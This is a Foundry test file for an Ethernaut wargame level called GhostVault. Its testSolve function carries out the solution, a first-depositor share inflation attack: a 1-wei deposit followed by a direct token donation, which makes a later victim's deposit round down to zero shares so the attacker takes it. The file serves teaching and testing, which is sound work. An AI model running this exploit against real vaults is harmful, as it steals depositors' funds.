// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {GhostVault} from "src/levels/GhostVault.sol";
import {GhostVaultFactory, DepositToken} from "src/levels/GhostVaultFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestGhostVault is Test, Utils {
    Ethernaut ethernaut;
    GhostVault instance;
    GhostVaultFactory factory;
    DepositToken dpt;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        factory = new GhostVaultFactory();
        dpt = factory.DPT();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = GhostVault(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the initial state of the level and environment.
    function testInit() public {
        vm.startPrank(player);
        assertEq(dpt.balanceOf(player), 1_000 ether);
        assertEq(instance.totalSupply(), 0);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
        vm.stopPrank();
    }

    /// @notice Test the solution for the level: no attacker contract needed.
    /// The player becomes the vault's first depositor with a 1 wei deposit,
    /// then donates the rest of their balance directly to the vault with a
    /// plain transfer, inflating the share price. When Bob's deposit lands,
    /// it rounds down to 0 shares and his assets fall into the player's lone
    /// share instead.
    function testSolve() public {
        vm.startPrank(player);

        uint256 balance = dpt.balanceOf(player);

        dpt.approve(address(instance), 1);
        instance.deposit(1, player);

        dpt.transfer(address(instance), balance - 1);

        // Bob's deposit is triggered through the instance, exactly like a
        // player would call it from the console: contract.triggerBobDeposit()
        instance.triggerBobDeposit();

        assertEq(instance.balanceOf(address(0xB0B)), 0);
        assertGt(instance.convertToAssets(instance.balanceOf(player)), 1_000 ether);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
        vm.stopPrank();
    }
}
